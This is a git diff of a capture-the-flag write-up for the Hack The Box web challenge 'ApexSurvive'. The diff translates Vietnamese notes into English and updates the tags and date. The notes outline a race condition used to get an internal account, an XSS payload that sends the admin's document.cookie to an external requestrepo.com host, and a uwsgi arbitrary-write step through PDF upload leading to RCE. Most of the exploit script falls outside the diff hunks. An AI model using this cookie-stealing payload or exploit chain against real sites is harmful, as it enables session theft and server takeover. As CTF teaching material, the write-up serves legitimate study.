@@ -1,23 +1,27 @@
 ---
 title: ApexSurvive
 description: ''
-date: 2025-09-14
 tags:
+  - writeup
   - xss
-  - race
-  - RCE
+  - csrf
+  - rce
+  - jwt
+  - file-upload
+  - race-condition
 category: web
-ctf_event: HTB
 draft: false
+ctf_event: HTB
+date: 2026-01-03
 ---
 
-![image.png](/uploads/apexsurvive/ApexSurvive/image.png)
+![image.png](/uploads/apexsurvive/apexsurvive/image.png)
 
-- Ý tưởng: Nhận thấy bot chỉ visit product id, hoặc nhiều hướng khác nhưng hướng ở đây unintended
-- Ta race để có internal account
+- Idea: Notice that bot only visits product id, or many other directions but the direction here is unintentional
+- We race to have an internal account
 - post lên product note chèn payload xss $&#123;fetch('[https://k31x5f3u.requestrepo.com/?'+document.cookie](https://k31x5f3u.requestrepo.com/?%27+document.cookie))&#125;, payload bypass check dom
-- lấy được cookie admin ra ngoài
-- tiếp ta tận dụng uwsgi arbitrary write để lên rce qua chức năng post pdf file
+- Get the admin cookie out
+- Next, we take advantage of uwsgi arbitrary write to upload rce via the post pdf file function
 
 ```python
 #!/usr/bin/env python3
@@ -106,5 +110,5 @@ pdf.image('./test.jpg')
 pdf.output('payload.pdf', 'F')
 ```
 
-- Ý tưởng bài này intended rất khó, có thể đọc để tham khảo thêm
+- The idea of ​​this article is intended to be very difficult, you can read it for further reference
 - https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/web/%5BInsane%5D%20apexsurvive/official_writeup.md
